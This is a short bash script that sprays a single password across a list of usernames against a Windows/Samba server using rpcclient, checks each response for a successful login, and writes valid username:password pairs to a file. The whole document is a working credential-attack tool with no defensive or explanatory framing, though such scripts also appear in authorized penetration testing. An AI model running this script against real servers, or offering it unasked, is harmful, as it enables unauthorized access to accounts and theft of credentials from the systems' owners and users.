#!/bin/bash

# Check if the required command-line arguments have been provided
if [ $# -ne 3 ]; then
    echo "Usage: $0 username_file password server_ip"
    exit 1
fi

# Assign the command-line arguments to variables
usernames_file=$1
pass=$2
server_ip=$3

# Specify the output file for valid username/password combinations
output_file="valid_usernames.txt"

# Loop through the list of usernames in the text file
while read username; do
  # Use the rpcclient command to verify if the login is successful
  output=$(rpcclient -U "$username%$pass" -c "getusername;quit" $server_ip 2>/dev/null)

  # Check if the output contains the successful connection message
  if [[ $output == *"Account Name: '$username'"* ]]; then
    # If the login is successful, add the username to the output file
    echo "$username:$pass" >> "$output_file"
    echo "Login successful for $username"
  fi
done < "$usernames_file"

echo "Valid username/password combinations have been exported to $output_file."
